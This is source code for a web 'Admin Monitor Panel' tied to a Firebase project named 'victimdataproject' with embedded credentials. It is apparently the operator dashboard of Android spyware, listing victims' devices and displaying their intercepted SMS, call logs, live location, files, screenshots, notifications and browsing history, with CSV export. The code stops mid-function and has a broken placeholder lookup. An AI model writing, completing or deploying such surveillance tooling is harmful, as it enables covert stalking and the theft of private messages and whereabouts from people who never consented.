<!DOCTYPE html>
<html lang="en" class="dark">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin Monitor Panel</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css" integrity="sha512-DTOQO9RWCH3ppGqcWaEA1BIZOC6xxalwEsw9c2QQeAIftl+Vegovlnee1c9QX4TctnWMn13TZye+giMm8e2LwA==" crossorigin="anonymous" referrerpolicy="no-referrer" />
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" integrity="sha256-p4NxAoJBhIIN+hmNHrzRCf9tD/miZyoHS5obTRR9BMY=" crossorigin=""/>
    <style>
        :root {
            --primary-bg: #1f2937; /* gray-800 */
            --secondary-bg: #374151; /* gray-700 */
            --tertiary-bg: #4b5563; /* gray-600 */
            --text-primary: #f3f4f6; /* gray-100 */
            --text-secondary: #d1d5db; /* gray-300 */
            --accent-color: #3b82f6; /* blue-500 */
        }
        body {
            background-color: var(--primary-bg);
            color: var(--text-primary);
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        .sidebar {
            background-color: var(--secondary-bg);
            transition: transform 0.3s ease-in-out;
        }
        .sidebar-item {
            transition: background-color 0.2s ease;
        }
        .sidebar-item:hover, .sidebar-item-active {
            background-color: var(--tertiary-bg);
        }
        .topbar {
            background-color: var(--secondary-bg);
        }
        .table th, .table td {
            border-color: var(--tertiary-bg);
        }
        .btn {
            transition: background-color 0.2s ease, transform 0.1s ease;
        }
        .btn:hover {
            opacity: 0.9;
        }
        .btn:active {
            transform: scale(0.98);
        }
        .modal {
            background-color: rgba(0,0,0,0.75);
        }
        .modal-content {
            background-color: var(--secondary-bg);
        }
        .live-dot {
            width: 8px;
            height: 8px;
            background-color: #22c55e; /* green-500 */
            border-radius: 50%;
            display: inline-block;
            margin-left: 8px;
            animation: pulse 1.5s infinite;
        }
        @keyframes pulse {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.5; }
        }
        ::-webkit-scrollbar { width: 8px; height: 8px; }
        ::-webkit-scrollbar-track { background: var(--secondary-bg); }
        ::-webkit-scrollbar-thumb { background: var(--tertiary-bg); border-radius: 4px;}
        ::-webkit-scrollbar-thumb:hover { background: #6b7280; /* gray-500 */ }

        /* For Leaflet map */
        #map { height: 300px; width: 100%; border-radius: 0.5rem; }
    </style>
</head>
<body class="overflow-x-hidden">

    <!-- Login View -->
    <div id="login-view" class="flex items-center justify-center min-h-screen p-4">
        <div class="bg-gray-800 p-8 rounded-lg shadow-xl w-full max-w-md">
            <h2 class="text-3xl font-bold text-center text-blue-400 mb-8">Admin Panel Login</h2>
            <form id="login-form">
                <div class="mb-4">
                    <label for="email" class="block text-gray-300 mb-2">Email</label>
                    <input type="email" id="email" class="w-full px-4 py-2 bg-gray-700 border border-gray-600 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500" required>
                </div>
                <div class="mb-6">
                    <label for="password" class="block text-gray-300 mb-2">Password</label>
                    <input type="password" id="password" class="w-full px-4 py-2 bg-gray-700 border border-gray-600 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500" required>
                </div>
                <button type="submit" class="w-full bg-blue-500 hover:bg-blue-600 text-white font-bold py-2 px-4 rounded-lg btn">Login</button>
                <p id="login-error" class="text-red-500 text-sm mt-4 text-center"></p>
            </form>
        </div>
    </div>

    <!-- Admin Panel View -->
    <div id="admin-panel-view" class="hidden">
        <div class="flex h-screen">
            <!-- Sidebar -->
            <aside id="sidebar" class="sidebar w-64 p-4 space-y-3 fixed lg:relative h-full z-30 -translate-x-full lg:translate-x-0">
                <div class="text-2xl font-bold text-blue-400 mb-6 flex items-center">
                    <i class="fas fa-shield-halved mr-2"></i> Admin Panel
                </div>
                <nav>
                    <a href="#dashboard" class="nav-link sidebar-item flex items-center p-2 rounded-lg hover:bg-gray-700" data-section="dashboard">
                        <i class="fas fa-tachometer-alt w-6 mr-2"></i> Dashboard
                    </a>
                    <a href="#devices" class="nav-link sidebar-item flex items-center p-2 rounded-lg hover:bg-gray-700" data-section="devices">
                        <i class="fas fa-mobile-alt w-6 mr-2"></i> Devices
                    </a>
                    <div id="device-specific-links" class="hidden ml-4 mt-2 border-l border-gray-500 pl-2">
                         <h4 class="text-sm text-gray-400 mb-1 mt-3" id="selected-device-alias-sidebar">Device: N/A</h4>
                        <a href="#device-info" class="nav-link sidebar-item flex items-center p-2 rounded-lg hover:bg-gray-700 text-sm" data-section="device-info">
                            <i class="fas fa-info-circle w-5 mr-2"></i> Device Info
                        </a>
                        <a href="#sms" class="nav-link sidebar-item flex items-center p-2 rounded-lg hover:bg-gray-700 text-sm" data-section="sms">
                            <i class="fas fa-sms w-5 mr-2"></i> SMS Logs
                        </a>
                        <a href="#calls" class="nav-link sidebar-item flex items-center p-2 rounded-lg hover:bg-gray-700 text-sm" data-section="calls">
                            <i class="fas fa-phone-alt w-5 mr-2"></i> Call Logs
                        </a>
                        <a href="#apps" class="nav-link sidebar-item flex items-center p-2 rounded-lg hover:bg-gray-700 text-sm" data-section="apps">
                            <i class="fas fa-th-large w-5 mr-2"></i> Installed Apps
                        </a>
                         <a href="#battery" class="nav-link sidebar-item flex items-center p-2 rounded-lg hover:bg-gray-700 text-sm" data-section="battery">
                            <i class="fas fa-battery-half w-5 mr-2"></i> Battery Info
                        </a>
                        <a href="#location" class="nav-link sidebar-item flex items-center p-2 rounded-lg hover:bg-gray-700 text-sm" data-section="location">
                            <i class="fas fa-map-marker-alt w-5 mr-2"></i> Location
                        </a>
                        <a href="#files" class="nav-link sidebar-item flex items-center p-2 rounded-lg hover:bg-gray-700 text-sm" data-section="files">
                            <i class="fas fa-folder-open w-5 mr-2"></i> File Logs
                        </a>
                        <a href="#screenshots" class="nav-link sidebar-item flex items-center p-2 rounded-lg hover:bg-gray-700 text-sm" data-section="screenshots">
                            <i class="fas fa-camera w-5 mr-2"></i> Screenshots
                        </a>
                        <a href="#notifications" class="nav-link sidebar-item flex items-center p-2 rounded-lg hover:bg-gray-700 text-sm" data-section="notifications">
                            <i class="fas fa-bell w-5 mr-2"></i> Notifications
                        </a>
                        <a href="#history" class="nav-link sidebar-item flex items-center p-2 rounded-lg hover:bg-gray-700 text-sm" data-section="history">
                            <i class="fas fa-history w-5 mr-2"></i> Browsing History
                        </a>
                    </div>
                </nav>
            </aside>

            <!-- Main Content -->
            <main class="flex-1 flex flex-col overflow-hidden">
                <!-- Topbar -->
                <header class="topbar shadow-md p-4 flex justify-between items-center">
                    <button id="sidebar-toggle" class="lg:hidden text-xl p-2 rounded-md hover:bg-gray-700">
                        <i class="fas fa-bars"></i>
                    </button>
                    <div class="text-gray-400 text-sm hidden sm:block">
                        <span id="admin-email-display"></span>
                    </div>
                    <button id="logout-button" class="bg-red-500 hover:bg-red-600 text-white font-semibold py-2 px-4 rounded-lg btn text-sm">
                        <i class="fas fa-sign-out-alt mr-1"></i> Logout
                    </button>
                </header>

                <!-- Page Content -->
                <div id="page-content" class="flex-1 p-4 sm:p-6 overflow-y-auto">
                    <!-- Content sections will be injected here -->
                </div>
            </main>
        </div>
    </div>

    <!-- Fullscreen Image Modal -->
    <div id="image-modal" class="fixed inset-0 modal hidden items-center justify-center z-50 p-4">
        <div class="modal-content p-4 rounded-lg shadow-xl max-w-4xl max-h-[90vh] overflow-auto relative">
            <img id="fullscreen-image" src="" alt="Fullscreen Image" class="max-w-full max-h-[80vh] object-contain mx-auto">
            <button id="close-modal-button" class="absolute top-2 right-2 text-gray-300 hover:text-white text-2xl bg-gray-800 rounded-full p-1 leading-none">
                ×
            </button>
        </div>
    </div>

    <!-- Leaflet JS -->
    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js" integrity="sha256-20nQCchB9co0qIjJZRGuk2/Z9VM+kNiyxNV1lvTlZBo=" crossorigin=""></script>

    <script type="module">
        // Firebase Config (as provided in the prompt)
        const firebaseConfig = {
            apiKey: "AIzaSyADpoTdgf5MZn7yPplT_cSRA8fngJvjibw",
            authDomain: "victimdataproject.firebaseapp.com",
            databaseURL: "https://victimdataproject-default-rtdb.firebaseio.com/",
            projectId: "victimdataproject",
            storageBucket: "victimdataproject.appspot.com",
            messagingSenderId: "938788267301",
            appId: "1:938788267301:web:cdcff391160dce48fa66cc"
        };

        // Import Firebase modules
        import { initializeApp } from "https://www.gstatic.com/firebasejs/9.22.1/firebase-app.js";
        import { getAuth, signInWithEmailAndPassword, onAuthStateChanged, signOut as firebaseSignOut } from "https://www.gstatic.com/firebasejs/9.22.1/firebase-auth.js";
        import { getDatabase, ref, onValue, set, update, get, child, serverTimestamp } from "https://www.gstatic.com/firebasejs/9.22.1/firebase-database.js";
        // import { getStorage, ref as storageRef, getDownloadURL } from "https://www.gstatic.com/firebasejs/9.22.1/firebase-storage.js"; // If direct storage interaction is needed

        // Initialize Firebase
        const app = initializeApp(firebaseConfig);
        const auth = getAuth(app);
        const db = getDatabase(app);
        // const storage = getStorage(app); // If needed

        // --- Global State ---
        let currentSection = 'dashboard';
        let selectedDeviceId = null;
        let selectedDeviceAlias = null;
        let deviceDataListeners = {}; // To store listeners for cleanup
        let mapInstance = null; // For Leaflet map

        // --- DOM Elements ---
        const loginView = document.getElementById('login-view');
        const adminPanelView = document.getElementById('admin-panel-view');
        const loginForm = document.getElementById('login-form');
        const loginError = document.getElementById('login-error');
        const adminEmailDisplay = document.getElementById('admin-email-display');
        const logoutButton = document.getElementById('logout-button');
        const pageContent = document.getElementById('page-content');
        const sidebar = document.getElementById('sidebar');
        const sidebarToggle = document.getElementById('sidebar-toggle');
        const navLinks = document.querySelectorAll('.nav-link');
        const deviceSpecificLinksContainer = document.getElementById('device-specific-links');
        const selectedDeviceAliasSidebar = document.getElementById('selected-device-alias-sidebar');

        const imageModal = document.getElementById('image-modal');
        const fullscreenImage = document.getElementById('fullscreen-image');
        const closeModalButton = document.getElementById('close-modal-button');


        // --- Placeholder Data ---
        const placeholderDeviceData = {
            "deviceUID_placeholder_1": {
                alias: "Demo Phone Alpha",
                lastSeen: Date.now() - (2 * 60 * 1000), // 2 mins ago
                deviceInfo: { model: "Pixel Demo", androidVersion: "12", ip: "192.168.1.101", simInfo: "Demo SIM", deviceName: "MyDemoPixel", registrationTime: Date.now() - (24 * 60 * 60 * 1000) },
                smsLogs: { sms1: { sender: "12345", message: "Hello from demo!", time: Date.now() - (5 * 60 * 1000), type: "inbox" } },
                callLogs: { call1: { number: "98765", type: "missed", duration: 0, date: Date.now() - (10 * 60 * 1000) } },
                installedApps: { app1: { appName: "DemoApp", packageName: "com.demo.app", type: "user" } },
                batteryInfo: { level: 75, isCharging: false, lastUpdated: Date.now() - (1 * 60 * 1000) },
                location: { latitude: 34.0522, longitude: -118.2437, timestamp: Date.now() - (3 * 60 * 1000), accuracy: 15 },
                fileLogs: { file1: { folderName: "Downloads", fileName: "demo.txt", extension: "txt", size: 1024, path: "/sdcard/Download/demo.txt" } },
                screenshots: { ss1: { url: "https://via.placeholder.com/300x200.png?text=Demo+Screenshot", timestamp: Date.now() - (15 * 60 * 1000), name: "demo_ss.png" } },
                notifications: { n1: { appName: "Demo Messenger", title: "New Message", content: "This is a demo notification.", timestamp: Date.now() - (2 * 60 * 1000), packageName: "com.demo.messenger" } },
                browsingHistory: { h1: { title: "Demo Site", url: "https://example.com", timestamp: Date.now() - (20 * 60 * 1000) } }
            }
        };


        // --- Utility Functions ---
        function formatTimestamp(timestamp, format = 'relative') {
            if (!timestamp) return 'N/A';
            const date = new Date(timestamp);
            if (format === 'full') {
                return date.toLocaleString();
            }
            if (format === 'timeAgo') {
                const seconds = Math.floor((new Date() - date) / 1000);
                let interval = seconds / 31536000;
                if (interval > 1) return Math.floor(interval) + " years ago";
                interval = seconds / 2592000;
                if (interval > 1) return Math.floor(interval) + " months ago";
                interval = seconds / 86400;
                if (interval > 1) return Math.floor(interval) + " days ago";
                interval = seconds / 3600;
                if (interval > 1) return Math.floor(interval) + " hours ago";
                interval = seconds / 60;
                if (interval > 1) return Math.floor(interval) + " mins ago";
                return Math.floor(seconds) < 5 ? "just now" : Math.floor(seconds) + " secs ago";
            }
            return date.toLocaleDateString() + ' ' + date.toLocaleTimeString();
        }

        function sanitizeHTML(str) {
            const temp = document.createElement('div');
            temp.textContent = str;
            return temp.innerHTML;
        }

        function createActionButton(text, iconClass, clickHandler, color = 'blue') {
            const button = document.createElement('button');
            button.className = `bg-${color}-500 hover:bg-${color}-600 text-white text-xs py-1 px-2 rounded btn`;
            button.innerHTML = `<i class="fas ${iconClass} mr-1"></i> ${text}`;
            button.onclick = clickHandler;
            return button;
        }

        function exportToCSV(data, filename) {
            if (!data || data.length === 0) {
                alert("No data to export.");
                return;
            }
            const headers = Object.keys(data[0]);
            const csvRows = [
                headers.join(','),
                ...data.map(row => headers.map(header => JSON.stringify(row[header] || '')).join(','))
            ];
            const csvString = csvRows.join('\n');
            const blob = new Blob([csvString], { type: 'text/csv;charset=utf-8;' });
            const link = document.createElement('a');
            if (link.download !== undefined) {
                const url = URL.createObjectURL(blob);
                link.setAttribute('href', url);
                link.setAttribute('download', `${filename}.csv`);
                link.style.visibility = 'hidden';
                document.body.appendChild(link);
                link.click();
                document.body.removeChild(link);
            }
        }

        // --- Authentication ---
        onAuthStateChanged(auth, user => {
            if (user) {
                loginView.classList.add('hidden');
                adminPanelView.classList.remove('hidden');
                adminEmailDisplay.textContent = user.email;
                navigateToSection('dashboard'); // Default section after login
                setupRealtimeListeners(); // General listeners like device list
            } else {
                loginView.classList.remove('hidden');
                adminPanelView.classList.add('hidden');
                adminEmailDisplay.textContent = '';
                selectedDeviceId = null;
                selectedDeviceAlias = null;
                updateDeviceSpecificLinksVisibility();
                cleanupAllDeviceDataListeners();
            }
        });

        loginForm.addEventListener('submit', async (e) => {
            e.preventDefault();
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;
            loginError.textContent = '';
            try {
                await signInWithEmailAndPassword(auth, email, password);
            } catch (error) {
                loginError.textContent = error.message;
                console.error("Login error:", error);
            }
        });

        logoutButton.addEventListener('click', async () => {
            try {
                await firebaseSignOut(auth);
            } catch (error) {
                console.error("Logout error:", error);
                alert("Error logging out: " + error.message);
            }
        });

        // --- Navigation & UI ---
        sidebarToggle.addEventListener('click', () => {
            sidebar.classList.toggle('-translate-x-full');
        });

        navLinks.forEach(link => {
            link.addEventListener('click', (e) => {
                e.preventDefault();
                const section = link.dataset.section;
                navigateToSection(section);
                if (window.innerWidth < 1024) { // lg breakpoint
                    sidebar.classList.add('-translate-x-full');
                }
            });
        });

        function navigateToSection(sectionId) {
            currentSection = sectionId;
            pageContent.innerHTML = `<h2 class="text-2xl font-semibold mb-4 capitalize text-blue-300">${sectionId.replace('-', ' ')}</h2><div id="${sectionId}-content" class="animate-fadeIn">Loading...</div>`;
            
            navLinks.forEach(l => l.classList.remove('sidebar-item-active', 'bg-gray-700'));
            const activeLink = document.querySelector(`.nav-link[data-section="${sectionId}"]`);
            if(activeLink) activeLink.classList.add('sidebar-item-active', 'bg-gray-700');

            // Render content based on section
            switch (sectionId) {
                case 'dashboard': renderDashboard(); break;
                case 'devices': renderDeviceList(); break;
                case 'sms': renderSmsLogs(); break;
                case 'calls': renderCallLogs(); break;
                case 'apps': renderInstalledApps(); break;
                case 'battery': renderBatteryInfo(); break;
                case 'location': renderLocation(); break;
                case 'files': renderFileLogs(); break;
                case 'screenshots': renderScreenshots(); break;
                case 'notifications': renderNotifications(); break;
                case 'history': renderBrowsingHistory(); break;
                case 'device-info': renderDeviceInfo(); break;
                default: pageContent.innerHTML = `<p>Section not found.</p>`;
            }
        }
        
        function updateDeviceSpecificLinksVisibility() {
            if (selectedDeviceId) {
                deviceSpecificLinksContainer.classList.remove('hidden');
                selectedDeviceAliasSidebar.textContent = `Device: ${selectedDeviceAlias || selectedDeviceId}`;
            } else {
                deviceSpecificLinksContainer.classList.add('hidden');
                selectedDeviceAliasSidebar.textContent = 'Device: N/A';
            }
        }

        function cleanupDeviceDataListener(path) {
            if (deviceDataListeners[path]) {
                deviceDataListeners[path](); // This is the unsubscribe function returned by onValue
                delete deviceDataListeners[path];
            }
        }

        function cleanupAllDeviceDataListeners() {
            Object.keys(deviceDataListeners).forEach(path => {
                if (deviceDataListeners[path]) deviceDataListeners[path]();
            });
            deviceDataListeners = {};
        }

        // --- Data Rendering Functions ---

        // DASHBOARD
        function renderDashboard() {
            const contentDiv = document.getElementById('dashboard-content');
            if (!contentDiv) return;
            contentDiv.innerHTML = `
                <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6">
                    <div class="bg-gray-800 p-6 rounded-lg shadow-lg">
                        <h3 class="text-xl font-semibold text-blue-400 mb-2">Total Devices</h3>
                        <p id="total-devices" class="text-3xl font-bold">0</p>
                    </div>
                    <div class="bg-gray-800 p-6 rounded-lg shadow-lg">
                        <h3 class="text-xl font-semibold text-green-400 mb-2">Online Devices</h3>
                        <p id="online-devices" class="text-3xl font-bold">0</p>
                    </div>
                    <div class="bg-gray-800 p-6 rounded-lg shadow-lg">
                        <h3 class="text-xl font-semibold text-yellow-400 mb-2">Total SMS (All Devices)</h3>
                        <p id="total-sms" class="text-3xl font-bold">0</p>
                    </div>
                    <div class="bg-gray-800 p-6 rounded-lg shadow-lg">
                        <h3 class="text-xl font-semibold text-purple-400 mb-2">Total Calls (All Devices)</h3>
                        <p id="total-calls" class="text-3xl font-bold">0</p>
                    </div>
                    <!-- Add more stats as needed -->
                </div>
                <div class="mt-8 bg-gray-800 p-6 rounded-lg shadow-lg">
                    <h3 class="text-xl font-semibold text-gray-300 mb-4">Quick Links</h3>
                    <div class="space-y-2">
                        <a href="#devices" data-section="devices" class="nav-link block text-blue-400 hover:underline">View All Devices</a>
                        <!-- Potentially add links to devices with recent activity -->
                    </div>
                </div>
            `;
            updateDashboardStats(); // Initial call
        }

        function updateDashboardStats() {
            const devicesRef = ref(db, 'devices');
            onValue(devicesRef, (snapshot) => {
                const devices = snapshot.val();
                if (devices) {
                    const deviceIds = Object.keys(devices);
                    document.getElementById('total-devices').textContent = deviceIds.length;

                    let onlineCount = 0;
                    let totalSms = 0;
                    let totalCalls = 0;

                    deviceIds.forEach(id => {
                        const device = devices[id];
                        if (device.lastSeen && (Date.now() - device.lastSeen < 5 * 60 * 1000)) { // Online if seen in last 5 mins
                            onlineCount++;
                        }
                        if (device.smsLogs) totalSms += Object.keys(device.smsLogs).length;
                        if (device.callLogs) totalCalls += Object.keys(device.callLogs).length;
                    });
                    document.getElementById('online-devices').textContent = onlineCount;
                    document.getElementById('total-sms').textContent = totalSms;
                    document.getElementById('total-calls').textContent = totalCalls;
                } else {
                    document.getElementById('total-devices').textContent = '0';
                    document.getElementById('online-devices').textContent = '0';
                    document.getElementById('total-sms').textContent = '0';
                    document.getElementById('total-calls').textContent = '0';
                }
            }, (error) => {
                console.error("Error fetching dashboard stats:", error);
                pageContent.innerHTML = `<p class="text-red-500">Error loading dashboard data: ${error.message}</p>`;
            });
        }


        // DEVICE LIST
        function renderDeviceList() {
            const contentDiv = document.getElementById('devices-content');
            if (!contentDiv) return;
            contentDiv.innerHTML = `
                <div class="mb-4 flex flex-col sm:flex-row justify-between items-center">
                    <input type="text" id="device-search" placeholder="Search by Name or UID..." class="w-full sm:w-1/2 px-3 py-2 bg-gray-700 border border-gray-600 rounded-lg focus:outline-none focus:ring-1 focus:ring-blue-500 mb-2 sm:mb-0">
                    <select id="device-filter-status" class="px-3 py-2 bg-gray-700 border border-gray-600 rounded-lg focus:outline-none focus:ring-1 focus:ring-blue-500">
                        <option value="all">All Statuses</option>
                        <option value="online">Online</option>
                        <option value="offline">Offline</option>
                    </select>
                </div>
                <div class="overflow-x-auto bg-gray-800 rounded-lg shadow">
                    <table class="w-full table-auto text-left table">
                        <thead class="bg-gray-700">
                            <tr>
                                <th class="px-4 py-3">UID</th>
                                <th class="px-4 py-3">Alias</th>
                                <th class="px-4 py-3">Status</th>
                                <th class="px-4 py-3">Last Seen</th>
                                <th class="px-4 py-3">Actions</th>
                            </tr>
                        </thead>
                        <tbody id="device-list-body">
                            <!-- Device rows will be injected here -->
                        </tbody>
                    </table>
                </div>
            `;
            
            const searchInput = document.getElementById('device-search');
            const filterSelect = document.getElementById('device-filter-status');

            const devicesRef = ref(db, 'devices');
            // Detach previous listener if any for this path
            cleanupDeviceDataListener('devices_list');

            deviceDataListeners['devices_list'] = onValue(devicesRef, (snapshot) => {
                const devicesData = snapshot.val() || placeholderDeviceData.devices; // Use placeholder if DB is empty
                displayDevices(devicesData, searchInput.value, filterSelect.value);

                searchInput.onkeyup = () => displayDevices(devicesData, searchInput.value, filterSelect.value);
                filterSelect.onchange = () => displayDevices(devicesData, searchInput.value, filterSelect.value);

            }, (error) => {
                console.error("Error fetching devices:", error);
                document.getElementById('device-list-body').innerHTML = `<tr><td colspan="5" class="text-center py-4 text-red-400">Error loading devices: ${error.message}</td></tr>`;
            });
        }

        function displayDevices(devices, searchTerm, statusFilter) {
            const tbody = document.getElementById('device-list-body');
            if (!tbody) return;
            tbody.innerHTML = ''; // Clear previous rows

            if (!devices || Object.keys(devices).length === 0) {
                tbody.innerHTML = `<tr><td colspan="5" class="text-center py-4">No devices found. Ensure companion app is sending data.</td></tr>`;
                return;
            }

            Object.entries(devices).forEach(([uid, device]) => {
                const alias = device.alias || 'N/A';
                const lastSeen = device.lastSeen;
                const isOnline = lastSeen && (Date.now() - lastSeen < 5 * 60 * 1000); // 5 minutes threshold
                const statusText = isOnline ? 'Online' : 'Offline';
                const statusColor = isOnline ? 'text-green-400' : 'text-red-400';

                // Apply filters
                if (statusFilter !== 'all' && (statusFilter === 'online' !== isOnline)) {
                    return;
                }
                if (searchTerm && 
                    !uid.toLowerCase().includes(searchTerm.toLowerCase()) && 
                    !alias.toLowerCase().includes(searchTerm.toLowerCase())) {
                    return;
                }

                const row = tbody.insertRow();
                row.className = "hover:bg-gray-750 border-b border-gray-700";
                row.innerHTML = `
                    <td class="px-4 py-3 text-sm text-gray-400">${uid}</td>
                    <td class="px-4 py-3">
                        <input type="text" value="${sanitizeHTML(alias)}" class="alias-input bg-transparent border-b border-gray-600 focus:border-blue-500 outline-none w-full" data-uid="${uid}" />
                    </td>
                    <td class="px-4 py-3 ${statusColor} font-semibold">${statusText} ${isOnline ? '<span class="live-dot"></span>' : ''}</td>
                    <td class="px-4 py-3 text-sm text-gray-400">${formatTimestamp(lastSeen, 'timeAgo')}</td>
                    <td class="px-4 py-3"></td>
                `;
                const actionCell = row.cells[4];
                actionCell.appendChild(createActionButton('View', 'fa-eye', () => {
                    selectedDeviceId = uid;
                    selectedDeviceAlias = device.alias || uid;
                    updateDeviceSpecificLinksVisibility();
                    navigateToSection('device-info'); // Navigate to device detail view
                }));

                const aliasInput = row.querySelector('.alias-input');
                aliasInput.addEventListener('change', (e) => updateDeviceAlias(uid, e.target.value));
            });

            if (tbody.rows.length === 0) {
                 tbody.innerHTML = `<tr><td colspan="5" class="text-center py-4">No devices match your criteria.</td></tr>`;
            }
        }

        async function updateDeviceAlias(uid, newAlias) {
            try {
                await update(ref(db, `devices/${uid}`), { alias: newAlias });
                console.log(`Alias updated for ${uid}`);
                if (uid === selectedDeviceId) selectedDeviceAlias = newAlias;
                updateDeviceSpecificLinksVisibility();
            } catch (error) {
                console.error("Error updating alias:", error);
                alert("Failed to update alias: " + error.message);
            }
        }
        
        // --- DEVICE SPECIFIC SECTIONS ---
        // (Helper function to render generic list data)
        function renderGenericList(sectionTitle, dataPath, columns, dataTransformer, exportFilename, extraControlsHtml = '') {
            const contentDiv = document.getElementById(`${currentSection}-content`);
            if (!contentDiv || !selectedDeviceId) {
                if (contentDiv) contentDiv.innerHTML = `<p>Please select a device from the Devices list first.</p>`;
                return;
            }
            contentDiv.innerHTML = `
                <div class="mb-4 flex flex-col sm:flex-row justify-between items-center">
                    <input type="text" id="${currentSection}-search" placeholder="Search..." class="w-full sm:w-1/2 px-3 py-2 bg-gray-700 border border-gray-600 rounded-lg focus:outline-none focus:ring-1 focus:ring-blue-500 mb-2 sm:mb-0">
                    <button id="${currentSection}-export-csv" class="bg-green-500 hover:bg-green-600 text-white font-semibold py-2 px-3 rounded-lg btn text-sm">
                        <i class="fas fa-file-csv mr-1"></i> Export CSV
                    </button>
                </div>
                ${extraControlsHtml}
                <div class="overflow-x-auto bg-gray-800 rounded-lg shadow">
                    <table class="w-full table-auto text-left table">
                        <thead class="bg-gray-700">
                            <tr>${columns.map(col => `<th class="px-4 py-3">${col.header}</th>`).join('')}</tr>
                        </thead>
                        <tbody id="${currentSection}-list-body"></tbody>
                    </table>
                </div>
                <div id="${currentSection}-pagination" class="mt-4 flex justify-center items-center space-x-2"></div>
            `;

            const fullDataPath = `devices/${selectedDeviceId}/${dataPath}`;
            cleanupDeviceDataListener(fullDataPath); // Clean previous listener for this specific path

            deviceDataListeners[fullDataPath] = onValue(ref(db, fullDataPath), (snapshot) => {
                let items = [];
                const rawData = snapshot.val();
                if (rawData) {
                    items = Object.entries(rawData).map(([key, value]) => ({ id: key, ...value }));
                } else if (placeholderDeviceData.devices[selectedDeviceId] && placeholderDeviceData.devices[selectedDeviceId][dataPath]) {
                    // Use placeholder if no real data and placeholder exists for this device & path
                    items = Object.entries(placeholderDeviceData.devices[selectedDeviceId][dataPath]).map(([key, value]) => ({ id: key, ...value }));
                }

                const transformedItems = items.map(dataTransformer);
                
                const searchInput = document.getElementById(`${currentSection}-search`);
                const exportButton = document.getElementById(`${currentSection}-export-csv`);

                displayPaginatedList(transformedItems, `${currentSection}-list-body`, `${currentSection}-pagination`, columns, searchInput.value);
                
                searchInput.onkeyup = () => displayPaginatedList(transformedItems, `${currentSection}-list-body`, `${currentSection}-pagination`, columns, searchInput.value);
                exportButton.onclick = () => exportToCSV(transformedItems.filter(item => applySearch(item, columns, searchInput.value)), exportFilename);

            }, (error) => {
                console.error(`Error fetching ${sectionTitle}:`, error);
                document.getElementById(`${currentSection}-list-body`).innerHTML = `<tr><td colspan="${columns.length}" class="text-center py-4 text-red-400">Error loading data: ${error.message}</td></tr>`;
            });
        }
        
        function applySearch(item, columns, searchTerm) {
            if (!searchTerm) return true;
            const term = searchTerm.toLowerCase();
            return columns.some(col => {
                const value = item[col.key];
                return value && String(value).toLowerCase().includes(term);
            });
        }

        let currentPage = 1;
        const itemsPerPage = 10;

        function displayPaginatedList(allItems, tbodyId, paginationId, columns, searchTerm) {
            const tbody = document.getElementById(tbodyId);
            const paginationControls = document.getElementById(paginationId);
            if (!tbody || !paginationControls) return;

            tbody.innerHTML = '';
            paginationControls.innerHTML = '';
            
            const filteredItems = allItems.filter(item => applySearch(item, columns, searchTerm));

            if (filteredItems.length === 0) {
                tbody.innerHTML = `<tr><td colspan="${columns.length}" class="text-center py-4">No data available or matches search.</td></tr>`;
                return;
            }

            const totalPages = Math.ceil(filteredItems.length / itemsPerPage);
            currentPage = Math.min(currentPage, totalPages) || 1;

            const startIndex = (currentPage - 1) * itemsPerPage;
            const endIndex = startIndex + itemsPerPage;
            const paginatedItems = filteredItems.slice(startIndex, endIndex);

            paginatedItems.forEach(item => {
                const row = tbody.insertRow();
                row.className = "hover:bg-gray-750 border-b border-gray-700";
                columns.forEach(col => {
                    const cell = row.insertCell();
                    cell.className = "px-4 py-3 text-sm";
                    cell.innerHTML = col.render ? col.render(item[col.key], item) : sanitizeHTML(item[col.key] || 'N/A');
                });
            });

            // Pagination Controls
            if (totalPages > 1) {
                // Previous Button
                const prevButton = document.createElement('button');
                prevButton.innerHTML = `<i class="fas fa-chevron-left"></i> Prev`;
                prevButton.className = "px-3 py-1 bg-gray-600 hover:bg-gray-500 rounded-md btn disabled:opacity-50";
                prevButton.disabled = currentPage === 1;
                prevButton.onclick = () => { currentPage--; displayPaginatedList(allItems, tbodyId, paginationId, columns, searchTerm); };
                paginationControls.appendChild(prevButton);

                // Page Info
                const pageInfo = document.createElement('span');
                pageInfo.textContent = `Page ${currentPage} of ${totalPages}`;
                pageInfo.className = "px-3 py-1 text-gray-400";
                paginationControls.appendChild(pageInfo);

                // Next Button
                const nextButton = document.createElement('button');
                nextButton.innerHTML = `Next <i class="fas fa-chevron-right"></i>`;
                nextButton.className = "px-3 py-1 bg-gray-600 hover:bg-gray-500 rounded-md btn disabled:opacity-50";
                nextButton.disabled = currentPage === totalPages;
                nextButton.onclick = () => { currentPage++; displayPaginatedList(allItems, tbodyId, paginationId, columns, searchTerm); };
                paginationControls.appendChild(nextButton);
            }
        }

        // SMS LOGS
        function renderSmsLogs() {
            const columns = [
                { header: 'Type', key: 'type', render: (type) => type === 'inbox' ? '<i class="fas fa-arrow-down text-green-400"></i> Inbox' : '<i class="fas fa-arrow-up text-blue-400"></i> Sent' },
                { header: 'Sender/Recipient', key: 'sender' },
                { header: 'Message', key: 'message', render: (msg) => `<span title="${sanitizeHTML(msg)}">${sanitizeHTML(msg.substring(0,50))}${msg.length > 50 ? '...' : ''}</span>` },
                { header: 'Time', key: 'time', render: (time) => formatTimestamp(time) }
            ];
            renderGenericList('SMS Logs', 'smsLogs', columns, (item) => item, 'sms_logs');
        }

        // CALL LOGS
        function renderCallLogs() {
            const columns = [
                { header: 'Type', key: 'type', render: (type) => {
                    let icon = 'fa-phone'; let color = 'text-gray-400';
                    if (type === 'incoming') { icon = 'fa-arrow-down'; color = 'text-green-400'; }
                    else if (type === 'outgoing') { icon = 'fa-arrow-up'; color = 'text-blue-400'; }
                    else if (type === 'missed') { icon = 'fa-phone-slash'; color = 'text-red-400'; }
